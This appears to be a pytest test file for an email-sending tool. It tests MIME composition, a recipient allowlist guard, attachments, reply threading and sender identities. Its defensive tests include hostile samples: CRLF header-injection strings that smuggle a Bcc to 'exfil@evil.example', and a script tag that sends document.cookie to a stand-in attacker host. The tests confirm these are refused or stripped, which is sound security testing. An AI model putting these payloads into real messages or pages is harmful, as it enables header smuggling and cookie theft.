"""Sender tests — MIME composition, the self-only allowlist guard, and reply
threading. Transport is always mocked; nothing leaves the machine."""
from __future__ import annotations

import email
import email.policy
import textwrap
from unittest.mock import patch

import pytest

from email_mcp import sender


@pytest.fixture(autouse=True)
def _clean_send_env(monkeypatch, tmp_path):
    """Start each test from documented defaults, not the caller's shell env."""
    for k in list(__import__("os").environ):
        if k.startswith("EMAIL_MCP_"):
            monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("EMAIL_MCP_FROM_ADDR", "paris.moschovakos@cern.ch")
    monkeypatch.setenv("EMAIL_MCP_FROM_NAME", "Paris Moschovakos")
    monkeypatch.setenv("EMAIL_MCP_STATE_DIR", str(tmp_path / "state"))
    monkeypatch.setenv("EMAIL_MCP_IDENTITIES", str(tmp_path / "no-identities.toml"))


@pytest.fixture
def capture_delivery(monkeypatch):
    """Mock the transport so we can inspect the composed message and assert
    it never gets sent when the guard fires."""
    sent: list = []
    monkeypatch.setattr(sender, "_socket_alive", lambda: True)
    monkeypatch.setattr(sender, "_deliver", lambda msg: sent.append(msg))
    return sent


# --------------------------------------------------------------------- #
# MIME composition                                                      #
# --------------------------------------------------------------------- #


def test_compose_is_clean_multipart_no_apple_wrapper():
    msg = sender.compose(
        to=["paris.moschovakos@cern.ch"],
        subject="Hi",
        body="Line one.\n\nSecond paragraph.",
    )
    assert msg.get_content_type() == "multipart/alternative"
    parts = list(msg.iter_parts())
    types = {p.get_content_type() for p in parts}
    assert types == {"text/plain", "text/html"}
    html_part = next(p for p in parts if p.get_content_type() == "text/html")
    html = html_part.get_content()
    # The whole point: none of Mail.app's collapsing wrapper.
    assert "URLShareWrapperClass" not in html
    assert "blockquote" not in html
    assert "<p>Line one.</p>" in html
    assert "<p>Second paragraph.</p>" in html
    assert msg["Message-ID"]


def test_compose_html_escapes_body():
    msg = sender.compose(
        to=["paris.moschovakos@cern.ch"], subject="x", body="a < b & c",
    )
    html = next(
        p for p in msg.iter_parts() if p.get_content_type() == "text/html"
    ).get_content()
    assert "a &lt; b &amp; c" in html


# --------------------------------------------------------------------- #
# header-injection fence + recipient validation                         #
# --------------------------------------------------------------------- #


def test_crlf_subject_rejected_on_send_and_schedule(
    monkeypatch, tmp_path, capture_delivery
):
    hostile = "Status\r\nBcc: exfil@evil.example"
    with pytest.raises(sender.SendError) as ei:
        sender.send_email(
            to="paris.moschovakos@cern.ch", subject=hostile, body="b",
        )
    assert "header_injection" in str(ei.value)
    assert capture_delivery == []  # {ok:false}, never a traceback or a send

    with pytest.raises(sender.SendError) as ei:
        sender.schedule_email(
            to="paris.moschovakos@cern.ch", subject=hostile, body="b",
            send_at="2036-01-01T09:00:00+00:00",
        )
    assert "header_injection" in str(ei.value)
    assert list((tmp_path / "state").rglob("*.json")) == []  # nothing frozen


def test_crlf_in_raw_recipient_rejected_before_split(capture_delivery):
    # _split would degrade the injected line into an extra recipient —
    # the raw string must be refused before it ever reaches getaddresses.
    with pytest.raises(sender.SendError) as ei:
        sender.send_email(
            to="paris.moschovakos@cern.ch\r\nevil@example.com",
            subject="s", body="b",
        )
    assert "invalid_recipient" in str(ei.value)
    assert capture_delivery == []


def test_junk_recipients_rejected(capture_delivery):
    for junk in ("1", "not-an-address"):
        with pytest.raises(sender.SendError) as ei:
            sender.send_email(to=junk, subject="s", body="b")
        assert "invalid_recipient" in str(ei.value), junk
        assert junk in str(ei.value)
    assert capture_delivery == []


def test_reply_sanitizes_hostile_stored_subject(
    monkeypatch, mail_fixture, capture_delivery
):
    """Provenance rule: a hostile subject already in the STORE is sanitized
    (CTL → space), not refused — the message must stay answerable."""
    import sqlite3

    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")
    db = sqlite3.connect(mail_fixture / "MailData" / "Envelope Index")
    db.execute("UPDATE subjects SET subject=? WHERE ROWID=1",
               ("I2C\r\nBcc: exfil@evil.example\x00disclosure",))
    db.commit()
    db.close()
    from email_mcp.sources.apple_mail import AppleMailSource

    src = AppleMailSource(mail_base=mail_fixture)
    res = sender.reply_email(src, id="100", body="Understood.")
    assert res.ok is True and len(capture_delivery) == 1
    subj = capture_delivery[0]["Subject"]
    assert subj == "Re: I2C  Bcc: exfil@evil.example disclosure"  # CTL → space
    assert "\r" not in subj and "\n" not in subj and "\x00" not in subj
    # no header actually smuggled in
    assert "exfil@evil.example" not in (capture_delivery[0]["Bcc"] or "")


def test_quote_html_strips_script_and_style_blocks():
    hostile = (
        "<html><body><p>Keep me.</p>"
        "<script>fetch('https://evil.example/'+document.cookie)</script>"
        "<style>body{display:none}</style></body></html>"
    )
    out = sender._quote_html(hostile, "", "On X, Y wrote:")
    assert "<p>Keep me.</p>" in out
    assert "<script" not in out.lower() and "fetch(" not in out
    assert "<style" not in out.lower() and "display:none" not in out


# --------------------------------------------------------------------- #
# allowlist guard                                                       #
# --------------------------------------------------------------------- #


def test_default_is_open_without_a_declaration(capture_delivery):
    """The 2026-08-01 flip: sending is unrestricted unless the identity
    DECLARES a restriction — the client's per-send prompt is the everyday
    checkpoint; the guard is the opt-in trial harness."""
    res = sender.send_email(to="stranger@example.org", subject="s", body="b")
    assert res.ok is True
    assert len(capture_delivery) == 1


def test_allowlist_blocks_foreign_recipient(monkeypatch, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "0")  # guard DECLARED
    with pytest.raises(sender.SendError) as ei:
        sender.send_email(
            to="colleague@cern.ch", subject="s", body="b",
        )
    assert "colleague@cern.ch" in str(ei.value)
    assert capture_delivery == []  # never reached the transport


def test_allowlist_allows_self(capture_delivery):
    res = sender.send_email(
        to="paris.moschovakos@cern.ch", subject="s", body="b",
    )
    assert res.ok is True
    assert len(capture_delivery) == 1


def test_allow_all_env_disables_guard(monkeypatch, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")
    res = sender.send_email(to="anyone@example.com", subject="s", body="b")
    assert res.ok is True
    assert len(capture_delivery) == 1


def test_foreign_cc_also_blocked(monkeypatch, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "0")  # guard DECLARED
    with pytest.raises(sender.SendError):
        sender.send_email(
            to="paris.moschovakos@cern.ch",
            cc="someoneelse@cern.ch",
            subject="s", body="b",
        )
    assert capture_delivery == []


def test_declared_allowlist_binds_and_admits_self(monkeypatch,
                                                  capture_delivery):
    """A declared allowlist engages the guard by itself — and the guard
    always admits the identity's own address (bcc_self rides on every
    send; a guard blocking even self-mail once blocked EVERYTHING for a
    listless allow_all = false identity)."""
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOWLIST", "camilla@example.com")
    assert sender.send_email(to="camilla@example.com",
                             subject="s", body="b").ok is True
    assert sender.send_email(to="paris.moschovakos@cern.ch",
                             subject="s", body="b").ok is True
    with pytest.raises(sender.SendError):
        sender.send_email(to="stranger@example.org", subject="s", body="b")


def test_custom_allowlist(monkeypatch, capture_delivery):
    monkeypatch.setenv(
        "EMAIL_MCP_SEND_ALLOWLIST",
        "paris.moschovakos@cern.ch, camilla@example.com",
    )
    res = sender.send_email(to="camilla@example.com", subject="s", body="b")
    assert res.ok is True


# --------------------------------------------------------------------- #
# bcc-to-self record                                                    #
# --------------------------------------------------------------------- #


def test_bcc_self_added_by_default(capture_delivery):
    sender.send_email(to="paris.moschovakos@cern.ch", subject="s", body="b")
    msg = capture_delivery[0]
    assert "paris.moschovakos@cern.ch" in (msg["Bcc"] or "")


def test_bcc_self_can_be_disabled(monkeypatch, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_BCC_SELF", "0")
    sender.send_email(to="paris.moschovakos@cern.ch", subject="s", body="b")
    msg = capture_delivery[0]
    assert msg["Bcc"] is None


# --------------------------------------------------------------------- #
# attachments                                                           #
# --------------------------------------------------------------------- #


def test_attachment_wraps_in_mixed_and_roundtrips(tmp_path, capture_delivery):
    f = tmp_path / "report.pdf"
    f.write_bytes(b"%PDF-1.4 fake body")
    res = sender.send_email(
        to="paris.moschovakos@cern.ch", subject="s", body="b",
        attachments=[str(f)],
    )
    assert res.ok is True
    assert res.attachments == ["report.pdf"]
    msg = capture_delivery[0]
    assert msg.get_content_type() == "multipart/mixed"
    # the plain+html alternative pair survives as the first part
    parts = list(msg.iter_parts())
    assert parts[0].get_content_type() == "multipart/alternative"
    att = list(msg.iter_attachments())[0]
    assert att.get_content_type() == "application/pdf"
    assert att.get_filename() == "report.pdf"
    assert att.get_content() == b"%PDF-1.4 fake body"


def test_attachment_multiple_and_unknown_type(tmp_path, capture_delivery):
    a = tmp_path / "notes.txt"
    a.write_text("hello")
    b = tmp_path / "blob.xyz123"
    b.write_bytes(b"\x00\x01")
    sender.send_email(
        to="paris.moschovakos@cern.ch", subject="s", body="b",
        attachments=[str(a), str(b)],
    )
    atts = {p.get_filename(): p for p in capture_delivery[0].iter_attachments()}
    assert set(atts) == {"notes.txt", "blob.xyz123"}
    assert atts["notes.txt"].get_content_type() == "text/plain"
    assert atts["blob.xyz123"].get_content_type() == "application/octet-stream"


def test_attachment_bare_string_is_one_path_not_split(tmp_path, capture_delivery):
    f = tmp_path / "a, weird, name.txt"
    f.write_text("x")
    sender.send_email(
        to="paris.moschovakos@cern.ch", subject="s", body="b",
        attachments=str(f),
    )
    assert [p.get_filename() for p in capture_delivery[0].iter_attachments()] \
        == ["a, weird, name.txt"]


def test_attachment_missing_file_blocks_send(tmp_path, capture_delivery):
    with pytest.raises(sender.SendError) as ei:
        sender.send_email(
            to="paris.moschovakos@cern.ch", subject="s", body="b",
            attachments=[str(tmp_path / "nope.pdf")],
        )
    assert "not found" in str(ei.value)
    assert capture_delivery == []


def test_attachment_directory_refused(tmp_path, capture_delivery):
    with pytest.raises(sender.SendError) as ei:
        sender.send_email(
            to="paris.moschovakos@cern.ch", subject="s", body="b",
            attachments=[str(tmp_path)],
        )
    assert "zip" in str(ei.value)
    assert capture_delivery == []


def test_attachment_size_budget_enforced(tmp_path, monkeypatch, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_MAX_ATTACH_MB", "0.001")  # ~1 KB
    f = tmp_path / "big.bin"
    f.write_bytes(b"\x00" * 4096)
    with pytest.raises(sender.SendError) as ei:
        sender.send_email(
            to="paris.moschovakos@cern.ch", subject="s", body="b",
            attachments=[str(f)],
        )
    assert "MB budget" in str(ei.value)
    assert capture_delivery == []


def test_no_attachments_stays_plain_alternative(capture_delivery):
    sender.send_email(
        to="paris.moschovakos@cern.ch", subject="s", body="b", attachments=[],
    )
    assert capture_delivery[0].get_content_type() == "multipart/alternative"


# --------------------------------------------------------------------- #
# reply threading                                                       #
# --------------------------------------------------------------------- #


def test_reply_threads_and_prefixes_subject(monkeypatch, mail_fixture, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")  # replying to Stefan
    from email_mcp.sources.apple_mail import AppleMailSource

    src = AppleMailSource(mail_base=mail_fixture)
    res = sender.reply_email(src, id="100", body="Understood.")
    assert res.ok is True
    msg = capture_delivery[0]
    assert msg["In-Reply-To"] == "<i2c-2026-05-01@cern.ch>"
    assert "<i2c-2026-05-01@cern.ch>" in msg["References"]
    assert msg["Subject"] == "Re: I2C disclosure on April 20"
    assert "stefan.schlenker@cern.ch" in msg["To"]


def test_reply_all_ccs_original_recipients_minus_self(monkeypatch, mail_fixture, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")
    from email_mcp.sources.apple_mail import AppleMailSource

    src = AppleMailSource(mail_base=mail_fixture)
    # message 101: From ops-bot, To paris, Cc ops-bot
    res = sender.reply_email(src, id="101", body="thanks", reply_all=True)
    assert res.ok is True
    msg = capture_delivery[0]
    # our own address must never appear in To/Cc of the reply
    joined = f"{msg['To']} {msg.get('Cc', '')}"
    assert "paris.moschovakos@cern.ch" not in joined


# --------------------------------------------------------------------- #
# reply history quoting                                                 #
# --------------------------------------------------------------------- #


def _parts(msg):
    plain = next(
        p for p in msg.iter_parts() if p.get_content_type() == "text/plain"
    ).get_content()
    html = next(
        p for p in msg.iter_parts() if p.get_content_type() == "text/html"
    ).get_content()
    return plain, html


def test_reply_quotes_original_below_body(monkeypatch, mail_fixture, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")
    from email_mcp.sources.apple_mail import AppleMailSource

    src = AppleMailSource(mail_base=mail_fixture)
    res = sender.reply_email(src, id="100", body="Understood.")
    assert res.ok is True
    plain, html = _parts(capture_delivery[0])
    # new body first, attribution + '>'-quoted original below
    assert plain.startswith("Understood.")
    assert "Stefan Schlenker" in plain and "wrote:" in plain
    assert "> The I2C disclosure on April 20 should be retracted." in plain
    assert plain.index("Understood.") < plain.index("wrote:")
    # HTML mirrors it inside a cite blockquote
    assert '<blockquote type="cite"' in html
    assert "retracted" in html and "wrote:" in html


def test_reply_html_quote_does_not_nest_documents(monkeypatch, mail_fixture, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")
    from email_mcp.sources.apple_mail import AppleMailSource

    src = AppleMailSource(mail_base=mail_fixture)
    # message 300 is HTML-only: its <html>/<body> wrapper must be unwrapped
    res = sender.reply_email(src, id="300", body="Noted.")
    assert res.ok is True
    plain, html = _parts(capture_delivery[0])
    assert html.count("<html>") == 1 and html.count("<body>") == 1
    assert '<blockquote type="cite"' in html and "Paris" in html
    # plain part still carries a readable quote derived from the HTML
    assert "wrote:" in plain and "> " in plain


def test_reply_include_history_false_is_bare(monkeypatch, mail_fixture, capture_delivery):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")
    from email_mcp.sources.apple_mail import AppleMailSource

    src = AppleMailSource(mail_base=mail_fixture)
    res = sender.reply_email(src, id="100", body="Understood.", include_history=False)
    assert res.ok is True
    plain, html = _parts(capture_delivery[0])
    assert "wrote:" not in plain and "retracted" not in plain
    assert "blockquote" not in html
    # threading still intact
    assert capture_delivery[0]["In-Reply-To"] == "<i2c-2026-05-01@cern.ch>"


def test_reply_with_attachment_keeps_quote_and_threading(
    monkeypatch, mail_fixture, tmp_path, capture_delivery
):
    monkeypatch.setenv("EMAIL_MCP_SEND_ALLOW_ALL", "1")
    from email_mcp.sources.apple_mail import AppleMailSource

    f = tmp_path / "minutes.pdf"
    f.write_bytes(b"%PDF-1.4 x")
    src = AppleMailSource(mail_base=mail_fixture)
    res = sender.reply_email(src, id="100", body="See attached.",
                             attachments=[str(f)])
    assert res.ok is True
    assert res.attachments == ["minutes.pdf"]
    msg = capture_delivery[0]
    assert msg.get_content_type() == "multipart/mixed"
    assert msg["In-Reply-To"] == "<i2c-2026-05-01@cern.ch>"
    assert [p.get_filename() for p in msg.iter_attachments()] == ["minutes.pdf"]
    # the quoted history still lives in the alternative pair
    alt = next(p for p in msg.iter_parts()
               if p.get_content_type() == "multipart/alternative")
    plain = next(p for p in alt.iter_parts()
                 if p.get_content_type() == "text/plain").get_content()
    assert "wrote:" in plain


# --------------------------------------------------------------------- #
# identities (from_identity)                                            #
# --------------------------------------------------------------------- #


def _write_identities(tmp_path, monkeypatch) -> None:
    """Two identities on different drivers; 'cern' is the file's default."""
    p = tmp_path / "identities.toml"
    p.write_text(textwrap.dedent("""\
        default = "cern"

        [cern]
        from_addr = "paris.moschovakos@cern.ch"
        from_name = "Paris Moschovakos"
        driver = "ssh_sendmail"
        host = "lxplus.cern.ch"
        user = "pmoschov"
        socket = "/tmp/sock-test"

        [gmail]
        from_addr = "parasxos@gmail.com"
        from_name = "Paris Moschovakos"
        driver = "smtp"
        host = "smtp.gmail.com"
        port = 587
        keychain = "email-mcp-gmail"
        # DECLARED guard: since the 2026-08-01 flip, an undeclared
        # identity is open — the cross-identity scoping test needs one
        # identity that actually restricts.
        allowlist = ["parasxos@gmail.com"]
    """))
    monkeypatch.setenv("EMAIL_MCP_IDENTITIES", str(p))


class _FakeTransport:
    """Records deliveries; ensure() always succeeds."""

    name = "fake"

    def __init__(self, ident, log):
        self.ident = ident
        self.log = log
        self.last_ensure_error = None

    def ensure(self):
        return True

    def deliver(self, raw, mail_from, rcpt_to):
        self.log.append((self.ident.name, raw, mail_from, rcpt_to))

    def healthcheck(self):
        return {"ok": True}


def test_from_identity_sets_headers_and_routes_transport(tmp_path, monkeypatch):
    _write_identities(tmp_path, monkeypatch)
    seen: list = []
    monkeypatch.setattr(
        sender.transports, "get_transport", lambda i: _FakeTransport(i, seen))
    res = sender.send_email(
        to="parasxos@gmail.com", subject="s", body="b", from_identity="gmail",
    )
    assert res.ok is True
    name, raw, mail_from, rcpt_to = seen[-1]
    assert name == "gmail"                        # routed to gmail's transport
    assert mail_from == "parasxos@gmail.com"      # gmail's envelope sender
    assert "parasxos@gmail.com" in rcpt_to
    msg = email.message_from_bytes(raw, policy=email.policy.default)
    assert "parasxos@gmail.com" in msg["From"]    # identity, not env default
    assert msg["Message-ID"].endswith("@gmail.com>")


def test_per_identity_allowlist_blocks_cross_identity_recipient(tmp_path, monkeypatch):
    _write_identities(tmp_path, monkeypatch)
    seen: list = []
    monkeypatch.setattr(
        sender.transports, "get_transport", lambda i: _FakeTransport(i, seen))
    with pytest.raises(sender.SendError) as ei:
        sender.send_email(
            to="paris.moschovakos@cern.ch",   # cern's self is NOT gmail's self
            subject="s", body="b", from_identity="gmail",
        )
    assert "gmail" in str(ei.value)               # error names the identity
    assert "paris.moschovakos@cern.ch" in str(ei.value)
    assert seen == []                             # never reached the transport


def test_unknown_identity_is_caller_fixable():
    # No identities file: only the synthesized "default" exists.
    with pytest.raises(sender.SendError) as ei:
        sender.send_email(
            to="paris.moschovakos@cern.ch", subject="s", body="b",
            from_identity="gmail",
        )
    msg = str(ei.value)
    assert "gmail" in msg      # names the unknown identity
    assert "default" in msg    # and lists what IS available
